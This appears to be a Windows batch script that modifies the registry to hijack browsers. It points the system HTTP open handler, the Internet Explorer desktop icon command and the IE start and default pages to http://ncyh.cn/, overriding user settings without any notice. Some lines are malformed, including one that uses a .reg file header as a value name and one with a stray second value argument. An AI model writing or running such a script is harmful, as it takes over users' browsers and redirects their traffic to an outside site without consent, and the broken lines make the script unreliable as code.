@echo off
reg add "HKLM\SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v @ /t REG_SZ /d "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE \"http://ncyh.cn/\"" /f
reg add "HKCR\HTTP\shell\open\command" /v @ /t REG_SZ /d "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE \"http://ncyh.cn/\"" /f
reg add "HKCR\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v @ /t REG_SZ /d "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE \"http://ncyh.cn/\"" /f
reg add "HKCR\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v Windows Registry Editor Version 5.00 /t REG_SZ /d  /f
reg add "HKCR\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v @ /t REG_SZ /d "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://ncyh.cn" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://ncyh.cn/ /f 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d http://ncyh.cn/ /v IgfxTray /f